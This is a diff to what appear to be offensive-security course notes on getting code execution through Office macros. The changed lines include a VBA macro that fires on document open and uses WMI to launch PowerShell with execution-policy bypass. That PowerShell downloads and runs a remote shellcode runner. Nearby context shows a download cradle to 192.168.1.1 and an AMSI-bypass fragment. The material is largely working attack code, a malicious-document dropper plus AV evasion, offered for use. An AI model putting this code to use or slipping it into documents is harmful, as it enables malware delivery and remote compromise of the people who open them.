@@ -137,7 +137,8 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 
 IEX(New-Object System.Net.WebClient).downloadString('http://192.168.1.1/run.ps1')
 
-The run.ps1 file is a powershell shellcode runner. Due to the complexity of this technique, we will base64 encode our PowerShell download cradle as follows:
+The run.ps1 file is a powershell shellcode runner(https://github.com/trike33/PEN-300-Code-Snippets/blob/main/powershell_reflection_shellcoderunner.ps1).
+Due to the complexity of this technique, we will base64 encode our PowerShell download cradle as follows:
 ~# pwsh
 ❯ pwsh
 PowerShell 7.2.1
@@ -193,6 +194,23 @@ Here is what the prependmigrate option does:
 PrependMigrate             false                      yes       Spawns and runs shellcode in new process
 ```
 (In a nutshell it spawns our shellcode in another process)
+
+As an alternative to the "PrependMigrate" option, we can dechain our powershell process with WMI as follows:
+
+```
+Sub MyMacro
+  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.1.1/run.ps1'))"
+  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+
+Sub AutoOpen()
+  MyMacro
+End Sub
+
+Sub Document_Open()
+  MyMacro
+End Sub
+```
 
 Additionally keep in mind that our shellcode must be for 32-bits -> very important, if we use x64 we won't get any shell
 
